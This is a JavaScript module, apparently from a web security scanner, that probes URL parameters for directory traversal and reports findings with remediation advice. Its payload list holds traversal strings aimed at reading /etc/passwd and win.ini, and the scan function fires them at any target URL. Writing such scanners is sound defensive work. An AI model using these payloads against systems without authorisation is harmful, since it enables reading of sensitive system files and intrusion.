// src/scanners/directoryTraversal.js
// Tests for Path/Directory Traversal vulnerabilities by injecting ../ sequences
// to attempt reading /etc/passwd (Linux) or win.ini (Windows).

const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const logger = require('../utils/logger');

const SCANNER_NAME = 'Directory Traversal Scanner';

const PAYLOADS = [
  '../../../../../../../../../../etc/passwd',
  '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', // URL encoded
  '../../../../../../../../../../windows/win.ini',
];

const SCAN_PARAMS = ['file', 'path', 'doc', 'image', 'load', 'view'];

const scan = async (targetUrl) => {
  const findings = [];
  try {
    const urlObj = new URL(targetUrl);
    
    if (urlObj.searchParams.toString() === '') {
      SCAN_PARAMS.forEach(p => urlObj.searchParams.append(p, 'default.png'));
    }

    const originalParams = Array.from(urlObj.searchParams.entries());

    for (const payload of PAYLOADS) {
      for (const [paramName, _] of originalParams) {
        const testUrlObj = new URL(targetUrl);
        testUrlObj.searchParams.set(paramName, payload);
        const testUrl = testUrlObj.toString();

        try {
          const response = await axios.get(testUrl, {
            timeout: 5000,
            validateStatus: () => true,
          });

          const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

          const isLinuxVuln = body.includes('root:x:0:0:') || body.includes('/bin/bash');
          const isWindowsVuln = body.toLowerCase().includes('[extensions]') && body.toLowerCase().includes('mpexe');

          if (isLinuxVuln || isWindowsVuln) {
            findings.push({
              findingId: uuidv4(),
              scanner: SCANNER_NAME,
              severity: 'CRITICAL',
              title: 'Directory Traversal / Local File Inclusion (LFI)',
              description: `The application is vulnerable to Directory Traversal via the '${paramName}' parameter. An attacker can read sensitive local files, such as /etc/passwd or win.ini.`,
              evidence: `Payload used: ${payload}\nURL: GET ${testUrl}\nFound system file contents in response body.`,
              owaspCategory: 'A01:2021 – Broken Access Control',
              remediation: 'Do not allow user input to direct file system operations. Whitelist allowed file names, or use indirect references (e.g. database IDs mapped to safe file paths).',
              references: [
                'https://owasp.org/www-community/attacks/Path_Traversal',
                'https://cwe.mitre.org/data/definitions/22.html',
              ],
            });
            return findings;
          }
        } catch (err) {
          // ignore
        }
      }
    }
  } catch (error) {
    logger.error(`[${SCANNER_NAME}] Error on ${targetUrl}: ${error.message}`);
  }

  return findings;
};

module.exports = { scan, SCANNER_NAME };
